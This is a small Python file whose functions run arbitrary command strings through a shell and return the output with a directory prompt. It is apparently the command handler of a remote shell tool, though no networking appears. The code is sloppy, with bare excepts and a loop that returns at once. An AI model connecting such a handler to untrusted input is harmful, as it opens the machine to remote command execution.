import subprocess
import os

def receive_commands(cmd):
    while cmd != 'exit':
        if cmd[:2] == 'cd':
            try:
                os.chdir(cmd[3:])
            except:
                pass
        if len(cmd) > 0:
            try:
                cmd_run = subprocess.Popen(cmd[:], shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                output_bytes = cmd_run.stdout.read() + cmd_run.stderr.read()
                output_str = str(output_bytes, "cp949")
                result = str(output_str + str(os.getcwd()) + "> ")
                if result == None:
                    hello = "\n"
                    return hello
                return result
                #print(output_str)
            except:
                output_str = "Commands Not Recognized" + "\n"
                result = str(output_str + str(os.getcwd()) + "> ")
                return result
                #print(output_str)

def r_s_c(cmd):
    try:
        real_cmd = cmd[7:]
        cmd_run = subprocess.Popen(real_cmd[:], shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_bytes = cmd_run.stdout.read() + cmd_run.stderr.read()
        output_str = str(output_bytes, "cp949")
        result = str(output_str)
        return result
    except:
        output_str = "Commands Not Recognized" + "\n"
        result = str(output_str + str(os.getcwd()) + "> ")
        return result

